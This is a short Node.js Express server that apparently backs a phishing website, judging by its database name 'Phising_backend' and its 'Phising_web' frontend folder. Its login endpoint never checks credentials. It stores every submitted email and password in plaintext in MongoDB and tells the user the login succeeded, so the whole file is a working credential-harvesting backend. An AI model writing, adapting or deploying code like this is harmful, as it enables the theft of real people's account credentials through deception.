const express=require("express")
const app=express();
const dotenv=require("dotenv").config();
const PORT=8000
const usermodule=require("./loginmodel");
const mongoose=require("mongoose")
const cors=require("cors")
const path=require("path")

const dirname=path.resolve();

app.use(express.json());
app.use(cors());
mongoose.connect("mongodb://localhost:27017/Phising_backend").then((result) => {
    console.log("result");
    
}).catch((err) => {
    console.log(err,"error occuring");
    
});
app.post("/api/login",async(req,res)=>{
    const {password,email}=req.body;
    const data=await usermodule.create({
        email,
        password
    });
    res.status(200).json({message:"your login successfully done"});
})
app.use(express.static(path.join(dirname,"/Phising_web/dist")));
app.get('*',(_,res)=>{
    res.sendFile(path.join(dirname,"frontend","dist","index.html"));
})
app.listen(PORT,()=>{
    console.log(PORT);
    
    console.log("Your Port connecting successfully");
    
})